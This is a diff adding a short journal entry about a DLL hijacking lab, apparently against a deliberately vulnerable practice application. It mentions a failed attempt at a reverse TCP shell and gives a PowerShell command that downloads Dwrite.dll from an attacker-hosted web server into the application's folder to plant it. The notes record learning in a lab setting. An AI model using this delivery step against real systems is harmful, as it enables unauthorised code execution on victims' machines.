@@ -1,3 +1,13 @@
+## 12/29/2022
+
+### DLL Hijacking Lab
+
+May seem trivial but I learned that you can't just copy paste .dll files using a text editor.... I wasn't able to set up a reverse tcp shell or ftp connection, so I tried that as a last resort. The only otherway to transfer files is to host a webserver and on the designated host access the webserver.
+
+Internet Explorer was hardened, even adding my attacker box to the trusted sites, and trusted intranet  in the IE settings did not let me bypass the content blockers. Had to use 
+
+(Powershell):
+`iwr -UseBasicParsing -Uri http://IP/Dwrite.dll -OutFile C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll`
 ## 12/28/2022
 
 ### DLL Hijacking
